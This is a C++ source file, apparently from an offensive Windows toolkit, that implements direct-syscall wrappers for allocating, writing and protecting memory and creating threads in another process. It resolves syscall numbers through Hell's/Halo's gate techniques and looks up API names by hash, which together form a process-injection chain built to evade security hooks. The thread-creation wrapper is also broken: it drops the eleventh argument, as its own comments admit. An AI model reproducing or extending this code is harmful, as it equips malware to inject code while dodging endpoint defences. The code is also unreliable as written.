#include "native_syscalls.h"
#include "../logger/logger.h"
#include "../utils/obfuscation.h"
#include "sys_sim.h" // Reuse resolving logic if possible, or reimplement
// Actually let's reuse SyscallSimulator logic for GetSSN but make it strict.

void NativeSyscalls::Init() {
    SyscallSimulator::Init(); 
}

DWORD NativeSyscalls::GetSSN(DWORD hash) {
    // Reuse the robust Hell's/Halo's gate logic we already built
    return SyscallSimulator::GetSSN(hash);
}

NTSTATUS NativeSyscalls::AllocateVirtualMemory(HANDLE hProcess, PVOID* baseAddress, ULONG_PTR zeroBits, PSIZE_T regionSize, ULONG allocType, ULONG protect) {
    DWORD ssn = GetSSN(Utils::HashString("NtAllocateVirtualMemory"));
    if (ssn == -1) return 0xC0000001; // STATUS_UNSUCCESSFUL

    SetCurrentSSN(ssn);
    return InvokeSyscall((PVOID)hProcess, (PVOID)baseAddress, (PVOID)(uintptr_t)zeroBits, (PVOID)regionSize, (PVOID)(uintptr_t)allocType, (PVOID)(uintptr_t)protect);
}

NTSTATUS NativeSyscalls::WriteVirtualMemory(HANDLE hProcess, PVOID baseAddress, PVOID buffer, SIZE_T size, PSIZE_T bytesWritten) {
    DWORD ssn = GetSSN(Utils::HashString("NtWriteVirtualMemory"));
    if (ssn == -1) return 0xC0000001;

    SetCurrentSSN(ssn);
    return InvokeSyscall((PVOID)hProcess, (PVOID)baseAddress, (PVOID)buffer, (PVOID)size, (PVOID)bytesWritten);
}

NTSTATUS NativeSyscalls::ProtectVirtualMemory(HANDLE hProcess, PVOID* baseAddress, PSIZE_T regionSize, ULONG newProtect, PULONG oldProtect) {
    DWORD ssn = GetSSN(Utils::HashString("NtProtectVirtualMemory"));
    if (ssn == -1) return 0xC0000001;

    SetCurrentSSN(ssn);
    return InvokeSyscall((PVOID)hProcess, (PVOID)baseAddress, (PVOID)regionSize, (PVOID)(uintptr_t)newProtect, (PVOID)oldProtect);
}

NTSTATUS NativeSyscalls::CreateThreadEx(PHANDLE threadHandle, ACCESS_MASK desiredAccess, PVOID objectAttributes, HANDLE processHandle, PVOID startRoutine, PVOID argument, ULONG createFlags, ULONG_PTR zeroBits, SIZE_T stackSize, SIZE_T maxStackSize, PVOID attributeList) {
    DWORD ssn = GetSSN(Utils::HashString("NtCreateThreadEx"));
    if (ssn == -1) return 0xC0000001;

    SetCurrentSSN(ssn);
    // 11 Arguments!
    // InvokeSyscall definition only covers 10.
    // We need to ensure we pass enough.
    // Actually, x64 syscall convention uses R10, RDX, R8, R9, then Stack.
    return InvokeSyscall((PVOID)threadHandle, (PVOID)(uintptr_t)desiredAccess, (PVOID)objectAttributes, (PVOID)processHandle, (PVOID)startRoutine, (PVOID)argument, (PVOID)(uintptr_t)createFlags, (PVOID)(uintptr_t)zeroBits, (PVOID)stackSize, (PVOID)maxStackSize); 
}
